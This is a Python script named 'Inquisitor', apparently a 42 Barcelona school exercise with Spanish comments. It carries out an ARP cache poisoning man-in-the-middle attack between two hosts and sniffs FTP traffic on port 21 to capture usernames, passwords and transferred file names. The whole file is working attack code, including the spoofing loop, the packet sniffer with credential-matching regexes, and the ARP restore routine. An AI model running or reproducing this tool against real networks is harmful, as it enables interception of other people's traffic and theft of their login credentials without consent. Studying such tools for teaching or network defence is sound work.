from distro import linux_distribution
from hamcrest import none
from scapy.all import *
from colorama import init, Fore
from multiprocessing import Process
import argparse
import time
import os
import re

banner = '''
  _____                   _     _ _             
 |_   _|                 (_)   (_) |            
   | |  _ __   __ _ _   _ _ ___ _| |_ ___  _ __ 
   | | | '_ \ / _` | | | | / __| | __/ _ \| '__|
  _| |_| | | | (_| | |_| | \__ \ | || (_) | |   
 |_____|_| |_|\__, |\__,_|_|___/_|\__\___/|_|   
                 | |                            
                 |_|                            

Coded by daniel.requena@aol.com (2022)
42 Barcelona
'''

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
YELLOW = Fore.YELLOW


def clear():
    '''
    Borra la pantalla
    '''
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def check_ip_forwarding():
    '''
    Comprueba IP forwarding. Si no se trata de linux muestra una advertencia pero no para la ejecucion
    '''
    print(f'{YELLOW}[!] Comprobando IP Forwarding...')
    
    if sys.platform == 'linux':
        file_path = "/proc/sys/net/ipv4/ip_forward"
        
        with open(file_path,"r") as f:
            if f.read():
                print(f'{GREEN}[+] IP Forwarding ON.')
                return 1
            else:
                print(f'{RED}[!] IP Forwarding OFF. Revise la configuracion de su SO')
                return 0
    else:
        print(f'{YELLOW}[!] No es posible validar IP Forwarding (SO no LINUX). Revise su configuracion.')
        return 1
             
    
def get_mac(ip,interface):
    '''
    Devuelve la direccion MAC de cualquier dispositivo conectado a la Red
    Si la IP esta caida (la maquina no responde) devuelve None
    NOTA: Si nuestra maquina tiene mas de una interface se tiene que especificar.
    Es por ello que es un parametro obligatorio en la entrada
    '''       
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, iface = interface,verbose=0)
    
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, interface):
    '''
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    '''
    # Obtiene la direccion MAC del objetivo (servidor)
    target_mac = get_mac(target_ip,interface)
        
    # No especificamos 'hwsrc' (direccion MAC origen)
    # porque por defecto 'hwsrc' es la direccion MAC REAL del emiasor (de nuestra maquina)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    
    # Enviamos el paquete
    # verbose = 0 significa que enviamos el paquete sin imprimir nada
    # Enviamos el paquete 3 veces para asegurarnos de su recepcion
    send(arp_response, verbose=0, count=3)
    

def spoof_thread(target_ip, host_ip, interface):
    '''
    Funcion que se usara para lanzarla como un nuevo proceso 
    '''
    salida = True
    
    while salida:
        try:
            spoof(target, host, interface)
            time.sleep(3)
            
            spoof(host, target, interface)
            time.sleep(3)
        except KeyboardInterrupt:            
            salida = False
    

def restore(target_ip, host_ip, interface):
    '''
    Se restauran las tablas ARP de las maquinas afectadas
    '''
    # Obtenemos la dirección MAC real de servidor y del cliente (ambos son spoofed)
    target_mac = get_mac(target_ip,interface)
    
    host_mac = get_mac(host_ip,interface)
    
    # Preparamos el correcto paquete
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    
    # Enviando el paquete de restauracion
    # para devolver a las tablas ARP a su estado original
    # Lo enviamos 7 veces para asegurarnos de que le llegue (count=7)
    send(arp_response, verbose=0, count=7)
    
    print('[!] Enviado a {} : {} restaurada la MAC original {}'.format(target_ip, host_ip, host_mac))


def process_packet(packet):
    '''
    Procesado de la informacion interceptada
    '''
    # Obtenemos la direccion IP de destino de la cabecera
    dest = packet.getlayer(IP).dst
    
    # Obtenemos el contenido en plano de los datos del datagrama
    raw = packet.sprintf('%Raw.load%')
    
    if verbose:
        print(f'{GREEN}[!] Paquete interceptado',raw)
    
    # Buscamos en el contenido interceptado las palabras clave
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    stor = re.findall('(?i)STOR (.*)', raw)
    retr = re.findall('(?i)RETR (.*)', raw)
                                 
    if user:        
        print(f'{RESET}[!] Detectado FTP Login %s: ' % str(dest))
        print(f'{RESET}[+] User: %s' % str(user[0]))
    elif pswd:
        print(f'{RESET}[+] Password: %s' % str(pswd[0]))
    elif stor:
        print(f'{RESET}[+] Fichero enviado: %s' % str(stor[0]))
    elif retr:
        print(f'{RESET}[+] Fichero recibido: %s' % str(retr[0]))


def is_valid_IP(str):
    '''
    Validar formato direccion IP
    '''
    return bool(re.match(r'^((0|[1-9][0-9]?|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.|$)){4}$', str))
 
   
''' 
    ------------------
    Llamada principal
    ------------------
'''         
if __name__ == "__main__":
    
    clear()
    print(banner)
        
    parser = argparse.ArgumentParser(description='Inquisitor envenena las tablas ARP de host origen y destino para a continuacion ' \
                                                + 'interceptar las comunicaciones realizadas mediante el protocolo FTP')    
    parser.add_argument('IP_src',
                        action='store',
                        help='IP Host origen')
    parser.add_argument('IP_target',
                        action='store', 
                        help='IP Host destino')
    parser.add_argument('-i','--iface',
                        dest='iface',
                        default='eth0',
                        help='Interface seleccionado')
    parser.add_argument('-v','--verbose',
                        dest='verb',
                        action='store_true',
                        help='Muetra todo el trafico interceptado PUERTO 21')
    args = parser.parse_args()
        
    target = args.IP_target
    host = args.IP_src
    interface = args.iface
    verbose = args.verb
       
    ''' 
    Validacion de formato de IP, si el IP forwarding esta activo o si las maquinas a atacar estan ON
    '''
    if not check_ip_forwarding():
        sys.exit()
    
    if not is_valid_IP(target) or not is_valid_IP(host):
        print(f'{RED}[!] El formato de las direcciones IP es incorrecto')
        sys.exit()
  
    print('[+] Accediendo a tablas ARP remotas....')
    target_mac = get_mac(target,interface)
    host_mac = get_mac(host,interface)
        
    print('[+] IP Victima ',target,'tiene como MAC asignada',target_mac)
    print('[+] IP Servidor',host,'tiene como MAC asignada',host_mac)
  
    if target_mac is None:
        print(f'{RED}[!] El host target',target,'es innacesible: no se puede acceder a su MAC')
        sys.exit()
    elif host_mac is None:
        print(f'{RED}[!] El host origen',host,'es inaccesible: no se puede acceder a su MAC')
        sys.exit()    
    
    print(f'{YELLOW}[!] Corrompiendo cada TRES SEGUNDOS las tablas ARP de',target,':',host)
    print(f'{YELLOW}[!] Nueva MAC asignada: ',ARP().hwsrc)
    
    ''' Mediante Process() lanzamos en un proceso a parte el envenenamiento de las tablas ARP
        De este modo se pueden envenenar cada 3 segundos a la vez que capturamos el trafico 
        que se intercambian por el puerto 21
    '''
    t = Process(target=spoof_thread, args=(target, host, interface))
    t.start()
    
    print(f"{GREEN}\n[+] Interceptando trafico puerto 21...\n")
    
    '''
        sniff los paquetes en el interface eth0 (VALOR POR DEFECTO)
    '''
    sniff(filter="tcp port 21", prn=process_packet, iface=interface, store=False)
    
    t.join()
    print(f'{RED}\n[!] Detectado CTRL+C ! Restaurando tablas ARP, por favor espere...')
    print(f'{YELLOW}')
    print(f'\n{YELLOW}[!] Finalizando envenamiento de tablas ARP')
    restore(target, host, interface)
    restore(host, target, interface)
    
    print(f'\n{GREEN}[+] Valores restaurados')
